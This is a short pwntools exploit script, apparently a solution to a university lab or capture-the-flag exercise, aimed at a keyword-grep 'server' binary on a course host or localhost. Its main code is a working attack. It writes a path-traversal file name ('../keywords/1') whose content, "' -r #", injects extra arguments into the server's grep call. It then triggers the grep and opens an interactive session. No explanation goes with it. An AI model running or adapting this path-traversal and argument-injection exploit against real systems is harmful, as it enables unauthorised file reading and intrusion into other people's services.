#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template server
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'server')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('lettieri.iet.unipi.it', 10_000)
    else:
        return remote('localhost', 10_000)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# MAXLINE 1024

import time

# greps the given keyword
def grep(id):
    io.sendline(b'g' + id)
    time.sleep(0.01)
    return io.recvline()

# creates a keywords and returns its id
def add(pattern):
    io.sendline(b'k'+pattern)
    time.sleep(0.01)
    return io.recvline()

# gets user file given its name
def user(file, content):
    io.sendline(b'u' + file)
    io.sendline(content)
    time.sleep(0.01)

io = start()
io.recvline() # flush

id = add(b'test')
assert id == b"1\n", print("salame", id)

user(f"../keywords/1".encode(),b"' -r #")

x = io.recvline(timeout=.01)
assert x == b"", print(x)

io.close()

io = start()
io.recvline() # flush

banana = grep(b'1')
print("banana", banana)

io.interactive()

